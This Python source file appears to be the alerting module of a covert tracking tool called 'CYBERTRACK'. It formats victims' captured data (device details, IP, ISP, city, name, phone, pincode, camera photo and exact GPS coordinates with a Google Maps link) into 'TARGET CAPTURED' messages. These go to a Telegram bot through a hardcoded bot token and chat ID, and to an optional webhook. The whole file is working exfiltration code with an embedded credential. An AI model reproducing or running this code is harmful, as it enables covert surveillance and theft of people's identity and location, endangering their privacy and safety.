import os
import httpx
import html
from typing import Dict, Any

DEFAULT_BOT_TOKEN = "8945438940:AAFfSVcNUDT3SUnRUr0qkGQgR6v21tM5j58"
DEFAULT_CHAT_ID = "6775626071"

WEBHOOK_URL = os.getenv("WEBHOOK_URL", "")


async def send_webhook_notification(log_entry: Dict[str, Any]):
    """
    Sends real-time capture alerts to Telegram or generic Webhooks (e.g. Discord, Make, Zapier).
    Uses HTML formatting to avoid Markdown parsing errors on device names or special characters.
    """
    token = os.getenv("TELEGRAM_BOT_TOKEN") or DEFAULT_BOT_TOKEN
    chat_id = os.getenv("TELEGRAM_CHAT_ID") or DEFAULT_CHAT_ID

    # 1. Telegram Notification
    if token and chat_id:
        try:
            brand = log_entry.get("device_brand", "")
            model = log_entry.get("device_model", "")
            device = f"{brand} {model}".strip() or "Unknown Device"
            
            city = log_entry.get("city")
            region = log_entry.get("region")
            country = log_entry.get("country", "")
            loc_parts = [p for p in [city, region, country] if p]
            loc_str = ", ".join(loc_parts) if loc_parts else "Unknown Location"
            
            ip = log_entry.get("ip_address", "—")
            isp = log_entry.get("isp", "—")
            phone = log_entry.get("captured_phone")
            pincode = log_entry.get("captured_pincode")
            name = log_entry.get("captured_name")
            photo = log_entry.get("captured_photo")
            gps_lat = log_entry.get("gps_lat")
            gps_lng = log_entry.get("gps_lng")
            gps_acc = log_entry.get("gps_accuracy")
            os_ver = log_entry.get("os", "—")

            # Escape HTML characters safely
            device_esc = html.escape(str(device))
            os_esc = html.escape(str(os_ver))
            ip_esc = html.escape(str(ip))
            isp_esc = html.escape(str(isp))
            loc_esc = html.escape(str(loc_str))

            msg = "🚨 <b>CYBERTRACK TARGET CAPTURED!</b>\n"
            msg += "───────────────────\n"
            msg += f"📱 <b>Device:</b> <code>{device_esc}</code>\n"
            msg += f"💻 <b>OS:</b> <code>{os_esc}</code>\n"
            msg += f"🌐 <b>IP:</b> <code>{ip_esc}</code>\n"
            msg += f"🏢 <b>Carrier/ISP:</b> <code>{isp_esc}</code>\n"
            msg += f"📍 <b>Location:</b> {loc_esc}\n"

            if name:
                msg += f"👤 <b>Name Captured:</b> <code>{html.escape(str(name))}</code>\n"
            if phone:
                msg += f"📞 <b>Phone Captured:</b> <code>{html.escape(str(phone))}</code>\n"
            if pincode:
                msg += f"📌 <b>Pincode:</b> <code>{html.escape(str(pincode))}</code>\n"
            if photo:
                msg += f"📸 <b>Camera Photo:</b> Captured!\n"

            if gps_lat and gps_lng:
                acc_str = f" (±{int(gps_acc)}m)" if gps_acc else ""
                maps_url = f"https://maps.google.com/?q={gps_lat},{gps_lng}"
                msg += f"\n🎯 <b>Exact GPS Satellite{acc_str}:</b>\n"
                msg += f"🔗 <a href='{maps_url}'>Open Location in Google Maps</a>\n"
            else:
                msg += f"🔵 <b>Precision:</b> IP Geolocation (ISP Hub)\n"

            msg += "───────────────────"

            telegram_url = f"https://api.telegram.org/bot{token}/sendMessage"
            async with httpx.AsyncClient(timeout=5.0) as client:
                resp = await client.post(telegram_url, json={
                    "chat_id": chat_id,
                    "text": msg,
                    "parse_mode": "HTML",
                    "disable_web_page_preview": False
                })
        except Exception as e:
            pass

    # 2. Generic HTTP Webhook (Discord / Custom API)
    if WEBHOOK_URL:
        try:
            async with httpx.AsyncClient(timeout=4.0) as client:
                await client.post(WEBHOOK_URL, json=log_entry)
        except Exception as e:
            pass
